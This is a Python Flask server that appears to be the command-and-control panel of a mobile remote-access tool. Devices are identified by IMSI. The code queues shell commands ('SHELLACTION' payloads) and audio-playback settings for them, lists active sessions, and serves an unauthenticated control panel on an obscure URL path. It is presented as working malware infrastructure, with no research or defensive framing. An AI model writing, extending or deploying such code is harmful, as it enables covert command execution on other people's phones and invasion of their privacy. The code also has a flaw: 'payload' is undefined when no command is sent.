from flask import Flask, render_template, request
import json, socket

class Web(object):
    def __init__(self):
        pass

    def start(self):
        app = Flask(__name__)

        @app.route('/api/postsender', methods=['POST'])
        def postapi():
            data = request.json
            imsi = data.get('imsi')
            command = data.get('cmd')
            audio_url = data.get('aaudio_url')
            audio_delay = data.get('aaudio_delay')
            audio_volume = data.get('aaudio_volume')
            audio_ss = data.get('aaudio_ss')
            audio_t = data.get('aaudio_t')
            if command != None:
                payload = {
                    f"{imsi}": {
                        "data": f"SHELLACTION{command}"
                    }
                }

            with open("./data/sendinfo.txt", 'w') as f:
                ppayload = json.dumps(payload)
                f.write(ppayload)
                f.close()

            return "ok"

        @app.route('/api/querysender')
        def sendapi():
            imsi = request.args.get("imsi")
            cmd = request.args.get("cmd")

            payload = {
                f"{imsi}": {
                    "data": f"{cmd}"
                }
            }

            with open("./data/sendinfo.txt", 'w') as f:
                ppayload = json.dumps(payload)
                f.write(ppayload)
                f.close()

            return "The command has been sent!"

        
        @app.route('/api/getsessions')
        def state():
            with open("./data/sessions.txt") as f:
                data = json.load(f)
                f.close()
                return data
        
        @app.route('/and/i/might/v4')
        def panel():
            return render_template("index.html")

        app.run(host="0.0.0.0", port=10111)